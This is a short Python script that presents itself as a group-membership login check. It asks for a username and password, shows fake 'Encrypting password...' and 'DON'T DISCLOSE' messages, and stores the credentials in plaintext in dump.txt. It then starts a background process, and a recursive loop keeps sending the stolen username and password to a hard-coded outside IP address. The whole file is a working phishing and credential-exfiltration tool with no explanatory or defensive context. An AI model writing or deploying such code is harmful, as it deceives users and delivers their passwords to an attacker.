#!/usr/bin/env python
import getpass, urllib, urllib2, subprocess, os.path, shlex
from time import sleep

def fire():
    f = open("dump.txt", "r")
    data = f.read()
    data = data.split(":")
    username = data[0]
    password = data[1]
    f.close()

    try:
        query_args = { 'username':username, 'password':password }
        encoded_args = urllib.urlencode(query_args)
        url = 'http://157.230.95.3:5001/save'
        print urllib2.urlopen(url, encoded_args).read()
    except:
        sleep(30)
        fire()

    sleep(10)
    
    fire()

if os.path.isfile('dump.txt'):
    fire()
else:
    username = raw_input("Enter your username: ")
    username = username.lower()

    print("CAUTION: DON'T DISCLOSE YOUR PASSWORD")
    password = getpass.getpass("Your password: ")

    f = open("shadow", "r")
    data = f.read()

    success = False

    print("Searching for details...")

    arr = data.split("\n")
    arr = [i for i in arr if i != ""]
    for i in arr:
        arr = i.split(":")
        if username in arr: 
            f = open("dump.txt", "w")
            f.write('%s:%s' % (username, password))
            success = True
            print("Encrypting password...")
            sleep(5)
            print("YOUR GROUP DETAILS ARE ACCURATE")
            print(arr)
    f.close()

    if success:
        subprocess.call(["chmod", "+x", "dec.py"])
        cmd = 'nohup ./dec.py &'
        s = subprocess.Popen(cmd.split())
    else:
        print("Your group username wasn't found. Kindly visit my office");
